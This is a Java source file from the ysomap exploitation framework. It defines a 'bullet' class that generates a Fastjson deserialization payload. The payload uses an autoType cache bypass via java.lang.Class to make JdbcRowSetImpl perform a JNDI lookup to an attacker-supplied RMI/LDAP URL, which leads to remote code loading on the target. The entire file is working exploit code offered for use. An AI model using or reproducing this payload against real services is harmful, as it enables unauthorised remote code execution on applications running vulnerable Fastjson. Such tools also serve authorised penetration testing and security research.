package ysomap.bullets.json;

import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3P1g
 * @since 2020/3/18
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("适用Fastjson，向外部发起jndi连接")
@Targets({Targets.FASTJSON})
@Dependencies({"fastjson"})
public class JdbcRowSetImplJsonBullet extends AbstractBullet<String> {

    @NotNull
    @Require(name = "jndiURL", detail = "jndi lookup url, like rmi://xxxx:1099/xxx")
    public String jndiURL;

    @Override
    public String getObject() {// 由于这里存在autoCommit 不是实际存在的属性，所以这里直接返回字符串
        return "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"xxxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":" +
                "\""+ jndiURL +"\",\"autoCommit\":true}}}";
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new JdbcRowSetImplJsonBullet();
        bullet.set("jndiURL", args[0]);
        return bullet;
    }
}
